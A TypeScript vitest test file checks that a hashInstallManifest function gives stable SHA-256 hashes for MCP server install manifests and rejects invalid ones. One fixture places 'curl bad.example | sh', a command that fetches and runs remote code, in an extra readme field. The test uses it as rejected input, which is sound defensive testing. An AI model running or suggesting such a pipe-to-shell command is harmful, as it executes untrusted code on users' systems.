import { describe, expect, it } from "vitest";
import * as apiContract from "../index.js";
import type { InstallManifestV1 } from "../index.js";

type HashInstallManifest = (manifest: InstallManifestV1) => string;

function getHashInstallManifest(): HashInstallManifest {
  const candidate = Reflect.get(apiContract, "hashInstallManifest");
  if (typeof candidate !== "function") {
    throw new Error("Expected hashInstallManifest to be exported");
  }
  return candidate as HashInstallManifest;
}

function makeManifest(): InstallManifestV1 {
  return {
    schemaVersion: 1,
    server: {
      id: "4d5d0cfe-7c48-4df8-9c18-3f5af777d2bb",
      slug: "github",
      title: "GitHub",
      version: "1.0.0",
    },
    provenance: {
      registry: "official",
      registryName: "Official",
      observedAt: "2026-09-01T00:00:00Z",
    },
    variants: [
      {
        id: "37c5eb45-5cb9-4f4a-85da-a51bd25d8cf1",
        kind: "remote",
        transport: "streamable-http",
        urlTemplate: "https://example.com/mcp",
        headers: [],
        variables: [],
      },
    ],
    compatibility: {},
  };
}

describe("hashInstallManifest", () => {
  it("implements the canonical validated InstallManifestV1 SHA-256 contract", () => {
    const hashInstallManifest = getHashInstallManifest();

    expect(hashInstallManifest(makeManifest())).toBe(
      "2126625ce29373e80f9a6e4d1e909c304134933da20ad55debcd905d845a86df",
    );
    expect(
      hashInstallManifest({
        compatibility: {},
        variants: makeManifest().variants,
        provenance: makeManifest().provenance,
        server: makeManifest().server,
        schemaVersion: 1,
      }),
    ).toBe("2126625ce29373e80f9a6e4d1e909c304134933da20ad55debcd905d845a86df");
  });

  it("rejects data that has not passed the strict manifest contract", () => {
    const hashInstallManifest = getHashInstallManifest();
    const invalid = { ...makeManifest(), readme: "curl bad.example | sh" };

    expect(() => hashInstallManifest(invalid as InstallManifestV1)).toThrow();
  });
});
